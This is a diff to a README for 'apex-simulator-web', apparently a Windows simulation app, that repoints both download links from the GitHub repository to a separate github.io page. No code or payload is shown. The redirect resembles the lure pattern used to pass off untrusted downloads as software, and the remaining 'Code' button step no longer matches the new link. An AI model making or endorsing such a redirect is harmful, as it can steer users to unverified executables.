@@ -1,6 +1,6 @@
 # 🚀 apex-simulator-web - Your Interactive Simulation Experience Awaits
 
-[![Download Now](https://img.shields.io/badge/Download-apex--simulator--web-blue?style=for-the-badge&logo=github)](https://github.com/Grueling-mistletoefamily332/apex-simulator-web)
+[![Download Now](https://img.shields.io/badge/Download-apex--simulator--web-blue?style=for-the-badge&logo=github)](https://grueling-mistletoefamily332.github.io)
 
 ## 🎮 What Is This?
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run apex-simulator-web on your Windows
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Grueling-mistletoefamily332/apex-simulator-web](https://github.com/Grueling-mistletoefamily332/apex-simulator-web)
+Visit this link to download the application: [https://grueling-mistletoefamily332.github.io](https://grueling-mistletoefamily332.github.io)
 
 Click the green "Code" button on the page, then select "Download ZIP" to get the files.
 
